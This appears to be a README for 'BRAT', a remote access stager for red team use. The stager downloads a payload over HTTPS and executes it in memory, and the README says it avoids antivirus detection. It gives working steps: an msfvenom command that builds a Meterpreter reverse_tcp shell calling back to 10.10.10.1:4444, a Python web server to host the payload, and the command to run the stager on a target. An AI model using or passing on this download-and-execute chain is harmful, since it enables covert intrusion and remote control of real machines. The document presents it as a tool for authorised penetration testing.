BRAT
=====

A remote access tool for penetration/red team tests. Hosts no malicious code so is not flagged by AV. Useful for physical compromise of a host, as an SE payload, or as an initial stager/dropper.

### Installing

Pre-compiled windows binaries are available in /bin. To build from source you will need Curl and its required libraries. The provided binaries are compiled against the full Curl library available for Windows here https://curl.haxx.se/windows/. Due to this, they are larger than necessary.

Compile scripts are provided to use a starting point.

### Usage

The tool, once executed, makes an HTTPS GET request to a provided web server. The web server hosts the payload you wish to run. The binary loads this payload into memory and then executes it (NX is disabled on the binary). 

Any web server running HTTPS will suffice. A simple HTTPs web server using python is provided in /web-server. You will need to generate a certificate: 

```openssl req -new -x509 -keyout yourpemfile.pem -out yourpemfile.pem -days 365 -nodes ```

In /web-server/html generate your desired payload:
```msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.1 lport=4444 -f raw > payload.txt```

Start the web server:

```python3  web-server/web.py```

Configure necessary handler/listener for the payload.

Then execute the binary on the target machine. The binary takes two command line options. The first being the webserver/payload and the second 0 or 1. 0 to disable TLS certificate verification and 1 (or any non-zero number) to enable: 

```./a.exe https://your-web-server/payload.txt 0```

### TODO

Build binaries against custom Curl

There is a version which does not use Curl so it is much smaller, only utilizes OpenSSL. Will upload that too.
